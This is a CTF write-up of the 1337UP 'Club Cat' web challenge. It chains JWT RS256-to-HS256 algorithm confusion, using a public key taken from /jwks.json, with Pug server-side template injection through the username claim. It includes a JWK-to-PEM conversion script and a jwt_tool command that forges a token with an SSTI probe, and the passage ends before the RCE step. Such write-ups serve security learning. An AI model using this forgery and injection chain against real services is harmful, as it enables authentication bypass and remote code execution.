## **Description**
People are always complaining that there's not enough cat pictures on the internet.. Something must be done!!
<br></br>

Reading the source code foud that JWT Rs256 keys are publicly accesable on /jwks.json route.
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/Capture.PNG">
<br></br>

So We can make a key confusion attack as descriped here
<br></br>
https://portswigger.net/web-security/jwt/algorithm-confusion

Reading more the source code found a route called /cats and there pug ssti in the username that been taken from the jwt token
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/2.PNG">
<br></br>
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs 
<br></br>
<br></br>
So After things been clear to as the attak surface will be:
1- Getting the RS256 Keys 
2- Make a key confsion attack to inject what we want in the username 
3- Pug SSti
4- get RCE and read the flag
<br></br>
<br></br>
I used a script to convert the rs256 into .pem file so i can use it with jwt_tool : 
```py
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers


jwk = {
    "kty": "RSA",
    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
    "e": "AQAB"
}


n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), byteorder='big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), byteorder='big')


public_numbers = RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()


pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Save to a .pem file
with open("public_key.pem", "wb") as pem_file:
    pem_file.write(pem)

print("Public RSA key saved to public_key.pem")
```
<br></br>
Let's create an account and take the jwt token
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/3.PNG">
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/4.PNG">

<br></br>
let's use jwt_too
```sh
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{7*7}"

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7Nyo3fSJ9.lsLiuUrEkr81Z73IyAJmF7gTJfp9WwqErjPlr9e9UvI
```
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/6.PNG">
<br></br>
It worked!, now let's see where the flag is, From the Dockerfile we can see that the flag is randomized and it's in the root directory.
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/7.PNG">
<br></br>
